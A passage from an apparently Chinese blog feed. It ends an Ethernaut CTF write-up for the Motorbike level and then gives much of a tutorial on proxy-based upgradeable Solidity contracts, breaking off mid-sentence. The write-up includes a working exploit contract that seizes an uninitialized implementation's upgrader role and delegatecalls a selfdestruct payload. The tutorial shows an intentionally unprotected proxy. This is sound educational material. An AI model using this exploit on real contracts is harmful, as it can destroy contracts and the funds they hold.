newImplementation, bytes memory data) external payable &#123;</span><br><span class="line">        _authorizeUpgrade();</span><br><span class="line">        _upgradeToAndCall(newImplementation, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Restrict to upgrader role</span><br><span class="line">    function _authorizeUpgrade() internal view &#123;</span><br><span class="line">        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span><br><span class="line">    function _upgradeToAndCall(address newImplementation,bytes memory data) internal &#123;</span><br><span class="line">        // Initial upgrade and setup call</span><br><span class="line">        _setImplementation(newImplementation);</span><br><span class="line">        if (data.length &gt; 0) &#123;</span><br><span class="line">            (bool success,) = newImplementation.delegatecall(data);</span><br><span class="line">            require(success, &quot;Call failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Stores a new address in the EIP1967 implementation slot.</span><br><span class="line">    function _setImplementation(address newImplementation) private &#123;</span><br><span class="line">        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        </span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := _IMPLEMENTATION_SLOT</span><br><span class="line">        &#125;</span><br><span class="line">        r.value = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题算是上面题目的简单版本，最终的目的是让合约执行<code>selfdestruct</code>函数自毁，在获得新实例后，在控制台获取的合约地址实际是<code>Motorbike</code>的地址，而<code>Engine</code>合约则被部署在了<code>_IMPLEMENTATION_SLOT</code>上。</p><p><code>Engine</code>中的该<code>initialize()</code>函数是一个伪构造函数，它允许代理合约在升级到新的实现逻辑合约时执行类似构造函数的操作。由于<code>constructor</code>代理不能调用实现的 ，因此该<code>initialize</code>函数取代了构造函数的位置。但是，请记住，这<code>initialize</code>对 Solidity 没有特殊意义——它只是可升级合约中常用的命名约定。就 Solidity 而言，<code>initialize</code>这只是另一个功能。</p><p>在获取到实例地址后先读取出<code>Enginr</code>的地址：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MotorBikeAddr = <span class="string">&quot;0x341f91ADf4e053242098f321D0aB9845d127F4A7&quot;</span></span><br><span class="line"><span class="keyword">const</span> slot = <span class="string">&quot;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&quot;</span></span><br><span class="line"><span class="keyword">const</span> EngineAddr = <span class="keyword">await</span> provider.getStorageAt(MotorBikeAddr, slot)</span><br><span class="line"><span class="comment">// 0x000000000000000000000000a75ad15322afa9a93a3dcb10b80accac24a7a3a3</span></span><br></pre></td></tr></table></figure><p>然后再读区一下<code>Enginr</code>合约中的<code>upgrader和horsePower</code>变量的内容。</p><p><img src="/image/Ethernaut.assets/image-20230223164319975.png" alt="image-20230223164319975"></p><p>他们的内容都为 <code>0</code>，说明此时<code>Engine</code>合约还没有执行<code>initialize()</code>函数，因此，我们可以通过外部调用<code>Engine</code>合约的<code>initialize()</code>函数，来让<code>Engine</code>合约的upgrader变成我们的地址。</p><p>又由于<code>upgradeToAndCall</code>函数调用了<code>_upgradeToAndCall</code>函数，而<code>_upgradeToAndCall</code>内部执行了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(bool success,) = newImplementation.delegatecall(data);</span><br></pre></td></tr></table></figure><p>这里<code>newImplementation</code>和<code>data</code>都是完全可控的，因此在这里设置<code>newImplementation</code>为我们自定义的恶意合约地址，<code>data</code>设定为自毁函数的<code>函数选择器</code>值，由于<code>delegatecall</code>是在本函数的上下文执行的，因此执行远程函数代码中的<code>selfdestruct</code>时，这个合约就会自毁，从而达到题目条件</p><p>攻击代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.7.0;</span><br><span class="line"></span><br><span class="line">contract exp &#123;</span><br><span class="line">    address target;</span><br><span class="line">    </span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        target = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step1_BeUpgrader() public &#123;</span><br><span class="line">        (bool succ, ) = target.call(abi.encodeWithSignature(&quot;initialize()&quot;));</span><br><span class="line">        require(succ,&quot;step1 failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step2_Exp() public &#123;</span><br><span class="line">        Bomb bomb = new Bomb();</span><br><span class="line">        (bool succ, ) = target.call(abi.encodeWithSignature(&quot;upgradeToAndCall(address,bytes)&quot;,address(bomb),abi.encodeWithSignature(&quot;destruct()&quot;)));</span><br><span class="line">        require(succ,&quot;step2 failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Bomb &#123;</span><br><span class="line">    function destruct()  external &#123;</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1-Fallback&quot;&gt;&lt;a href=&quot;#1-Fallback&quot; class=&quot;headerlink&quot; title=&quot;1. Fallback&quot;&gt;&lt;/a&gt;1. Fallback&lt;/h3&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;ta</summary>
      
    
    
    
    
    <category term="智能合约 CTF" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CTF/"/>
    
  </entry>
  
  <entry>
    <title>Upgradeable Contract 可升级合约</title>
    <link href="https://banana69.site/2023/02/21/Upgradeable-Contract/"/>
    <id>https://banana69.site/2023/02/21/Upgradeable-Contract/</id>
    <published>2023-02-21T11:09:45.000Z</published>
    <updated>2023-02-23T13:29:16.687Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>区块链的不可更改性与传统的软件开发过程有根本性的冲突，在传统的软件开发过程中，代码被不断地更新以修复错误和增加新的功能。在智能合约可以通过一些技术在不改变代码的条件下增加新的功能。主要是通过<code>deldegatecall</code>和回退函数<code>fallback</code>实现。</p><h3 id="0x02-代码和存储"><a href="#0x02-代码和存储" class="headerlink" title="0x02 代码和存储"></a>0x02 代码和存储</h3><p><img src="Upgradeable-Contract.assets/20230106095207.png" alt="Foundry test on command"></p><p>我们将智能合约在执行过程中的EVM状态分为持久性和易失性状态。持久性状态在不同的交易中都会被记住，而易失性状态在交易执行后会立即被遗忘。EVM代码和存储都是持久性的，而堆栈、内存、程序计数器和剩余gas的值都是易失性的。在这里，我们将关注点放在代码和存储部分，他们对理解可升级合约来说很重要。</p><p>虽然代码和存储都是持久的，但两者之间有一个根本的区别。存储是可变的，可以被修改，而代码一旦部署就不可改变。为此，代码与存储在内存的只读部分分开保存。这种分离使得<code>delegatecall</code>指令成为可能，它使用一个合约的代码和另一个合约的存储</p><p>区分存储和内存是很重要的。存储器是持久的，它将32个字节的地址映射到32个字节的值，这些值被称为slot。另一方面，内存是不稳定的，它将32字节的地址映射为1字节1字节的值。换句话说，存储是按字处理（一个字是32字节），而内存是按字节处理的。</p><p>在 Solidity 中，任何在合约层声明的变量都被映射到一个或多个slot。例如，考虑下面的合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Token &#123;</span><br><span class="line">  address immutable owner; //immutable 表示不可变，不占用 slot</span><br><span class="line">  uint256 public totalSupply;</span><br><span class="line">  mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function mint(address user, uint256 amount) external &#123;</span><br><span class="line">    require(msg.sender == owner, &quot;Only owner is allowed to mint&quot;);</span><br><span class="line">    balanceOf[user] += amount;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个变量被映射到slot 0，第二个被映射到slot 1 [注1]，下图为这个合约的存储结构：</p><blockquote><p>注1：若占用少于32字节的变量可以存储在同一个slot中。例如，一个slot可以包含两个类型为<code>uint128</code>的变量。</p></blockquote><p><img src="Upgradeable-Contract.assets/40.png" alt="Foundry方案"></p><p>像 <code>address </code>和 <code>uint256 </code>这样的简单类型的值最多需要32个字节，因此可以放入一个存储槽，但对于形如 <code>mapping(address =&gt; uint) a;</code> 的映射类型变量，就无法简单仿照值类型按顺序储存了。对于映射，其会根据上节提到的规则占据位置 <code>p</code> 处的一个插槽，但该插槽不会被真正使用。映射中的键 <code>k</code> 所对应的值会位于 <code>keccak256(k . p)</code>， 其中 <code>.</code> 是连接符。如果该值同时是一个非基本类型，则将 <code>keccak256(k . p)</code> 作为偏移量来找到具体的位置。</p><p>如果我们想访问<code>balanceOf[addr]</code>，相应的槽被计算出来，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keccak(</span><br><span class="line">  leftPadTo32Bytes(addr) ++ leftPadTo32Bytes(1)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>我们把key（这里是：<code>addr</code>）和映射的槽号（这里是：1），把它们都零扩展到32字节，把它们连接起来（用++表示），最后计算结果的keccak哈希值。下面的 Foundry 测试展示了如何用 Solidity 来表达:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract StorageTest is Test &#123;</span><br><span class="line">    address Alice = makeAddr(&quot;Alice&quot;);</span><br><span class="line"></span><br><span class="line">    function testLoadBalance() public &#123;</span><br><span class="line">        Token t = new Token(&quot;Hi&quot;);</span><br><span class="line">        t.mint(Alice, 5 ether);</span><br><span class="line"></span><br><span class="line">        // Compute the slot at which Alice&#x27;s balance is stored in the Token contract</span><br><span class="line">        bytes32 aliceBalanceSlot = keccak256(</span><br><span class="line">            abi.encodePacked(uint256(uint160(Alice)), uint256(1))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // Now load Alice&#x27;s balance</span><br><span class="line">        uint256 aliceBalance = uint256(vm.load(address(t), aliceBalanceSlot));</span><br><span class="line"></span><br><span class="line">        // Make sure that the loaded balance matches Alice&#x27;s real balance</span><br><span class="line">        assertEq(aliceBalance, t.balanceOf(Alice));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="Upgradeable-Contract.assets/image-20230221194303023.png" alt="image-20230221194303023"></p><p>在这个例子中，我们想检索<code>t.balanceOf(Alice)</code>的值，但我们没有直接这样做，而是手动计算Alice的余额所在的槽。为此，<code>aliceBalanceSlot</code>是按照上面的描述计算的。然后我们使用 Foundry 提供的 <a href="https://book.getfoundry.sh/cheatcodes/load">vm.load()</a> 来加载合约 <code>Token</code>中存储在slot上的值。最后，我们使用 <code>assertEq()</code> 来确保我们实际上已经加载了正确的值</p><p>对于像Token这样的简单合约，我们可以很容易地手动计算出合约变量的slot。然而对于使用继承的更复杂的合约，或者有多个变量被存储在同一个slot中的合约，要计算合约变量的位置就变的很困难。Foundry 提供了一个命令来可视化合约的存储布局。例如，要显示 Token 合约的存储布局，你可以使用以下命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge inspect Token storage-layout</span><br></pre></td></tr></table></figure><p><img src="Upgradeable-Contract.assets/image-20230221194830454.png" alt="image-20230221194830454"></p><p><a href="https://github.com/naddison36/sol2uml">sol2uml</a> 可以用于分析已经部署的合约。</p><h3 id="0x03-delegatecall-委托调用"><a href="#0x03-delegatecall-委托调用" class="headerlink" title="0x03 delegatecall 委托调用"></a>0x03 delegatecall 委托调用</h3><p>这主要是由于<code>delegatecall</code>指令[注2]，它使用一个合约的代码，并使用另一个合约的存储来执行它，因此可以通过该指令升级智能合约并改变其行为。这可以通过一个简单的例子来说明。</p><blockquote><p>注2: 如果我们一般性地谈论改变合约的行为，那么这已经可以用<code>selfdestruct</code>来实现了，因为它<em>删除了所有</em>代码。虽然这是一种非常有限的（而且不是非常有用的）改变合约行为的形式，但当与<a href="https://medium.com/consensys-diligence/smart-contract-security-newsletter-16-create2-faq-b641405044bf">create2</a>结合时，就有了更多的可能性。然而，<code>delegatecall</code>仍然是实现可升级合约的主要方式。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Counter &#123;</span><br><span class="line">  uint256 number;</span><br><span class="line"></span><br><span class="line">  function get() external view returns(uint256) &#123;</span><br><span class="line">    return number;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function add(uint256 n) external &#123;</span><br><span class="line">    require(n &lt;= 5, &quot;Max increment is 5&quot;);</span><br><span class="line">    number += n;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract DelegateCounter &#123;</span><br><span class="line">  uint256 number;</span><br><span class="line"></span><br><span class="line">  function get() external view returns(uint256) &#123;</span><br><span class="line">    return number;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function delegateAdd(Counter c, uint256 n) external &#123;</span><br><span class="line">    bytes memory callData = abi.encodeWithSignature(&quot;add(uint256)&quot;, n);</span><br><span class="line">    (bool ok,) = address(c).delegatecall(callData);</span><br><span class="line"></span><br><span class="line">    if(!ok) revert(&quot;Delegate call failed&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Counter合约代表了一个每次最多只能增加5的计数器，其定义了<code>add()</code>函数来执行这个操作，还定义了<code>get()</code>函数来获取当前计数器的值，除了函数<code>delegateAdd()</code>外，<code>DelegateCounter</code>合约与<code>Counter</code>基本相同。为了解释<code>delegateAdd()</code>是如何工作的，下面给出这两个合约的结构：</p><p><img src="Upgradeable-Contract.assets/20230106095227.png" alt="Foundry test on command"></p><p><code>delegateAdd()</code>使用<code>delegatecall</code>来执行来自合约<code>Counter</code>的函数<code>add()</code>，使用<code>DelegateCounter</code>的上下文来存储。两个合约应该有兼容的存储布局，也就是说，它们应该将相同的变量分配到相同的slot中。</p><p><code>delegatecall</code>是Solidity中的一个低级原语，使用起来不如普通函数调用方便。一般来说，每当我们想在一个合约上调用一个函数时，我们需要同时指定我们想调用的函数和我们想传递的论据。这些信息需要以一种众所周知的格式进行编码，以便目标合约知道如何解释它。这种格式也被称为应用二进制接口（ABI），并在 <code>合约ABI规范 </code>中描述。对于正常的函数调用，Solidity为我们做了这个编码，但是当使用<code>delegatecall</code>时，需要自己获取编码。这是在<code>delegateAdd()</code>的第一行完成的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory callData = abi.encodeWithSignature(&quot;add(uint256)&quot;, n);</span><br></pre></td></tr></table></figure><p><code>encodeWithSignature()</code>的第一个参数表示我们要调用的函数的签名，其余参数表示我们要传递给该函数的值。在上面的例子中，我们对一个名为add的函数的调用进行了编码，该函数需要一个<code>uint256</code>类型的参数，其值应该是<code>n</code>。如果我们假设<code>n</code>是，例如，4，那么<code>callData</code>将看起来如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x1003e2d20000000000000000000000000000000000000000000000000000000000000004</span><br></pre></td></tr></table></figure><p>前四个字节代表 “函数选择器”，它是通过获取函数签名的 keccak 哈希值中最重要的前四个字节计算出来的。这个函数签名是 “add(uint256)”，我们可以使用 Foundry 自带的 cast 命令行工具来计算其 keccak 哈希值。</p><p><img src="Upgradeable-Contract.assets/image-20230222114710713.png" alt="image-20230222114710713"></p><p>然后把它传递给<code>deldegatacall</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(bool ok,) = address(c).delegatecall(callData);</span><br></pre></td></tr></table></figure><p>这一行在当前合约的上下文中执行函数<code>Counter.add()</code>。任何由<code>Counter.add()</code>执行的存储访问都将使用调用合约的存储，在此案例中，它是<code>DelegateCounter</code>类型。因此，当<code>Counter.add()</code>函数写到slot 0以更新存储变量<code>number</code>时，它更新的是<code>DelegateCounter</code>的存储，而不是<code>Counter</code>的存储。</p><p><code>delegatecall</code>返回两个值。一个表示调用是否成功的布尔值，和一个包含任何返回数据的字节数组。由于<code>Counter.add()</code>不返回任何东西，<code>delegateAdd()</code>忽略返回数据，只检查调用是否成功。这里用一个固定的消息来作为revert 消息，而不是返回原始错误。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!ok) revert(&quot;Delegate call failed&quot;);</span><br></pre></td></tr></table></figure><p>在forge中进行测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract DelegateCallTest is Test &#123;</span><br><span class="line">    function testDelegate() public &#123;</span><br><span class="line">        Counter c = new Counter();</span><br><span class="line">        DelegateCounter d = new DelegateCounter();</span><br><span class="line"></span><br><span class="line">        // Sanity check: both counters should start at zero</span><br><span class="line">        assertEq(c.get(), 0);</span><br><span class="line">        assertEq(d.get(), 0);</span><br><span class="line"></span><br><span class="line">        d.delegateAdd(c, 4);</span><br><span class="line"></span><br><span class="line">        // Check that `d` has been updated</span><br><span class="line">        assertEq(c.get(), 0);</span><br><span class="line">        assertEq(d.get(), 4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Upgradeable-Contract.assets/image-20230222115303905.png" alt="image-20230222115303905"></p><p>首先创建了 <code>Counter </code>和 <code>DelegateCounter </code>合约的新实例，他们的计数器的初始值都为 0，调用<code>d.delegateAdd(c, 4)</code>。如上所述，<code>delegateAdd()</code>本质上是调用<code>c.add(4)</code>，其方式是所有存储访问都指向<code>d</code>而不是<code>c</code>。下面两个断言验证了这一点，它们检查了<code>c</code>仍然为零，而<code>d</code>已经被更新。</p><p>我们可以将任何合约传递给<code>delegateAdd()</code>，它实现了一个签名为<code>add(uint256)</code>的函数。因此，即使 <code>DelegateCounter </code>保持不变，我们也可以通过向 <code>delegateAdd() </code>传递一些其他合约来改变其行为。然而，为了完全实现可升级的合约，我们还需要关注会退函数。在这之前，如何处理<code>delegatecall</code>的第二个返回值，即包含从被调用函数返回的数据的字节数组也是很有用的。</p><h3 id="0x04-处理-delegatecall-返回值"><a href="#0x04-处理-delegatecall-返回值" class="headerlink" title="0x04 处理 delegatecall 返回值"></a>0x04 处理 delegatecall 返回值</h3><p>使用<code>delegatecall</code>比正常的函数调用复杂，因为我们必须根据ABI对调用进行手动编码。从调用中返回的数据也是如此。我们只是得到一个原始的字节数组，我们需要根据被调用的函数的返回类型自己解码。为了说明如何做到这一点，我们现在为<code>DelegateCounter</code>实现一个<code>delegateGet()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract DelegateCounter &#123;</span><br><span class="line">  // ...</span><br><span class="line"></span><br><span class="line">  function delegateGet(Counter c) external returns(uint256) &#123;</span><br><span class="line">    bytes memory callData = abi.encodeWithSignature(&quot;get()&quot;);</span><br><span class="line">    (bool ok, bytes memory retVal) = address(c).delegatecall(callData);</span><br><span class="line"></span><br><span class="line">    if(!ok) revert(&quot;Delegate call failed&quot;);</span><br><span class="line"></span><br><span class="line">    return abi.decode(retVal, (uint256));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个实现与<code>delegateAdd()</code>非常相似。我们首先对我们想要执行的调用进行ABI编码，然后使用<code>delegatecall</code>来进行调用。然而，这一次我们也处理了由调用返回的数据，我们将其存储在<code>retVal</code>中。因为<code>get()</code>返回一个<strong>uint256</strong>，ABI规定像<strong>uint256</strong>这样的固定宽度类型的值是通过简单的取其<a href="https://en.wikipedia.org/wiki/Endianness">big-endian</a>表示并将结果填充到32字节来编码的，返回的数据可以通过简单的将retVal 类型转换为<strong>uint256</strong>来解码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return uint256(bytes32(retVal));</span><br></pre></td></tr></table></figure><p>对于复杂的类型，解码变得更加复杂。Solidity提供了函数<code>abi.decode()</code>，可以为我们执行解码。使用这个函数，我们可以将返回语句重写如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return abi.decode(retVal, (uint256));</span><br></pre></td></tr></table></figure><p>函数<code>abi.decode()</code>需要两个参数。一个包含一些ABI编码值的字节数组，以及一个包含编码值类型的元组。</p><h3 id="0x05-泛化"><a href="#0x05-泛化" class="headerlink" title="0x05 泛化"></a>0x05 泛化</h3><p>我们可以对<code>delegateGet()</code>做最后的修改，以便对处理返回数据的方式进行概括。注意，当我们用<code>abi.decode(retVal, (uint256))</code>对返回数据进行解码时，我们对返回类型进行了硬编码。如果我们想在任意函数中使用<code>delegatecall</code>，那么我们也需要能够处理任意的返回数据。这在纯 Solidity 中是不可能的，所以我们需要转向汇编。特别是，我们需要替换：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return abi.decode(retVal, (uint256));</span><br></pre></td></tr></table></figure><p>将其替换为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">  let data := add(retVal, 32)</span><br><span class="line">  let size := mload(retVal)</span><br><span class="line">  return(data, size)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="Upgradeable-Contract.assets/20230106095235.png" alt="协议方案" style="zoom:50%;" /><p><code>return(data,size)</code>指令结束当前函数的执行，并返回由<code>data</code>和<code>size</code>给出的内存范围内的数据，其中data表示起始地址，<code>size</code>表示数据的字节大小（详见<a href="https://docs.soliditylang.org/en/latest/yul.html#specification-of-yul">Yul规范</a>）。在上面的例子中，<code>data</code>和<code>size</code>的计算方式可能不是很明显。要理解这一点，重要的是要知道数组是如何在内存中布局的。首先，请注意，当我们从汇编块中引用像<code>retVal</code>这样的内存变量时，我们实际上是指它的地址。因此，当我们在上面的汇编块中使用<code>retVal</code>时，我们指的是<code>retVal</code>所表示的字节数组在内存中的起始地址。其次，Solidity在内存中排列数组的方式如下 [注4]。首先是数组的长度, 存储为一个32字节的无符号数字, 然后是所有的数组元素. 因此，<code>retVal</code>的数组长度直接存储在<code>retVal</code>的地址（我们通过<code>mload</code>加载），为了得到数组元素的地址，我们需要给<code>retVal</code>增加一个32字节的偏移量。</p><blockquote><p>注4: 这与数组在存储中的布局不同，<a href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html">存储中状态变量的布局</a>和<a href="https://docs.soliditylang.org/en/latest/internals/layout_in_memory.html">内存中的布局</a>。</p></blockquote><p>有了上述汇编，我们可以简单地转发任何来自<code>delegatecall</code>的返回数据，而不需要知道编码后的值的类型。这使得我们可以调用任意的函数而不需要事先知道它们的返回类型。</p><p>最后的代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function delegateGetBetter(Counter c) external returns(uint256) &#123;</span><br><span class="line">        bytes memory callData = abi.encodeWithSignature(&quot;get()&quot;);</span><br><span class="line">        (bool ok, bytes memory retVal) = address(c).delegatecall(callData);</span><br><span class="line"></span><br><span class="line">        if(!ok) revert(&quot;Delegate call failed&quot;);</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            let data := add(retVal, 32)</span><br><span class="line">            let size := mload(retVal)</span><br><span class="line"></span><br><span class="line">            // The `return` instruction expects two arguments that describe the region in memory</span><br><span class="line">            // that contains the return data:</span><br><span class="line">            // - The address in memory that stores the beginning of the return data.</span><br><span class="line">            // - The size of the return data in bytes.</span><br><span class="line">            //</span><br><span class="line">            // `retVal` refers to a byte array in memory. The first slot (32 bytes) contains the</span><br><span class="line">            // number of elements, and the following slots contain the elements themselves.</span><br><span class="line">            return(data, size)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="0x06-回退函数"><a href="#0x06-回退函数" class="headerlink" title="0x06 回退函数"></a>0x06 回退函数</h3><p><a href="https://docs.soliditylang.org/en/latest/contracts.html#fallback-function">回退函数</a>是实现可升级合约时另一个有用的功能。它们允许开发者指定当一个不存在的函数被调用时应该发生什么。默认的行为是回退，但这可以被改变。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface Ifc &#123;</span><br><span class="line">  function hello() external;</span><br><span class="line">  function bye() external;</span><br><span class="line">&#125;</span><br><span class="line">contract C &#123;</span><br><span class="line">  event Log(string msg);</span><br><span class="line"></span><br><span class="line">  function hello() external &#123;</span><br><span class="line">    emit Log(&quot;hello&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    emit Log(&quot;fallback&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面我们定义了一个带有函数<code>hello()</code>和<code>bye()</code>的简单接口。此外，我们定义了一个合约<code>C</code>，它包含一个函数<code>hello()</code>和一个<em>fallback</em>函数。现在考虑下面的例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ifc ifc = Ifc(address(new C()));</span><br><span class="line">ifc.hello(); // Emits Log(&quot;hello&quot;)</span><br><span class="line">ifc.bye();   // Emits Log(&quot;fallback&quot;)</span><br></pre></td></tr></table></figure><p>我们创建了一个新的合约<code>C</code>的实例，并将其转换为 <code>Ifc</code> 类型，这使得我们可以同时调用<code>hello()</code>和<code>bye()</code>。当我们调用<code>Bye()</code>时，由于<code>C</code>没有定义，所以会执行回退函数。</p><p>一个有用的事实是，我们可以使用<code>msg.data</code>来访问触发回退函数的原始调用数据。例如，如果在<code>C</code>的回退函数中加入<code>console.logBytes(msg.data)</code>，那么在调用<code>ifc.bye()</code>时就会产生如下日志信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xe71b8b93</span><br></pre></td></tr></table></figure><p>这是<code>bye()</code>的函数选择器，这意味着通过检查<code>msg.data</code>我们可以确定用户最初打算调用哪个函数。</p><h3 id="0x07-可升级合约"><a href="#0x07-可升级合约" class="headerlink" title="0x07 可升级合约"></a>0x07 可升级合约</h3><p>使用<code>delegatecall</code>和回退函数，我们可以实现一个基于<strong>代理</strong>的可升级合约的一般解决方案。其核心思想如下。对于每一个我们希望其代码可以升级的合约，我们实际上部署了<em>两个</em>合约。一个<em>代理合约</em>和一个<em>逻辑合约</em>。代理合约是存储所有数据的合约，而逻辑合约则包含对这些数据进行操作的功能。用户将只与代理合约进行交互。当用户在代理上调用一个函数时，代理会使用一个委托调用将调用转发给逻辑合约。因为代理使用委托调用，执行逻辑合约的函数会影响代理的存储。因此，当使用可升级合约时，代理持有状态，而逻辑合约持有代码。从用户的角度来看，代理的行为与逻辑合约的行为是一样的。升级合约只是意味着代理使用了一个新的逻辑合约。</p><h4 id="7-1-实现一个代理合约"><a href="#7-1-实现一个代理合约" class="headerlink" title="7.1 实现一个代理合约"></a>7.1 实现一个代理合约</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract FaultyProxy &#123;</span><br><span class="line">  address public implementation;</span><br><span class="line"></span><br><span class="line">  function upgradeTo(address newImpl) external &#123;</span><br><span class="line">    implementation = newImpl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    (bool ok, bytes memory returnData) = implementation.delegatecall(msg.data);</span><br><span class="line"></span><br><span class="line">    if(!ok)</span><br><span class="line">      revert(&quot;Calling logic contract failed&quot;);</span><br><span class="line"></span><br><span class="line">    // Forward the return value</span><br><span class="line">    assembly &#123;</span><br><span class="line">      let data := add(returnData, 32)</span><br><span class="line">      let size := mload(returnData)</span><br><span class="line">      return(data, size)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代理合约在一般情况下是不起作用的，代理有一个全局变量<code>implementation</code>，它存储了逻辑合约的地址。通过调用<code>upgradeTo()</code>可以改变逻辑合约，使逻辑（代码）可以升级。（目前所有人都可以调用<code>upgradeTo()</code>。这里还需要使用的回退函数，它的目的是转发任何对使用<code>delegatecall</code>的逻辑合约的调用。(除了对<code>upgradeTo()</code>和<code>implementation()</code>的调用，这些调用是由代理本身处理的。) 但我们怎么知道用户想调用哪个函数呢？幸运的是，触发回退函数的原始calldata可以通过<code>msg.data</code>访问。 [注 5]。由于 calldata 包含函数签名和参数值，我们可以将 <code>msg.data</code>传递给<code>delegatecall</code>,，之后再检查是否调用成功，如果不成功就 revert，否则就转发返回数据。</p><blockquote><p>注 5： 回退函数也可以使用不同的签名，其中calldata被直接作为参数传递。更多信息请参见 Solidity 文档 关于 <a href="https://learnblockchain.cn/docs/solidity/contracts.html#fallback">fallback 函数</a> 的说明。</p></blockquote><p>下面给出一个使用如何使用代理合约的例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 创建逻辑合约</span><br><span class="line">Counter logic = new Counter();</span><br><span class="line"></span><br><span class="line">// 创建代理并告诉他应该使用的逻辑合约</span><br><span class="line">FaultyProxy proxy = new FaultyProxy();</span><br><span class="line">proxy.upgradeTo(address(logic));</span><br><span class="line"></span><br><span class="line">// 为了从逻辑合约中调用函数，将代理转为正确的类型</span><br><span class="line">Counter proxied = Counter(address(proxy));</span><br><span class="line"></span><br><span class="line">// 将代理合约看作是逻辑合约</span><br><span class="line">proxied.add(2);</span><br><span class="line"></span><br><span class="line">// 检查是否生效</span><br><span class="line">console.log(&quot;counter = 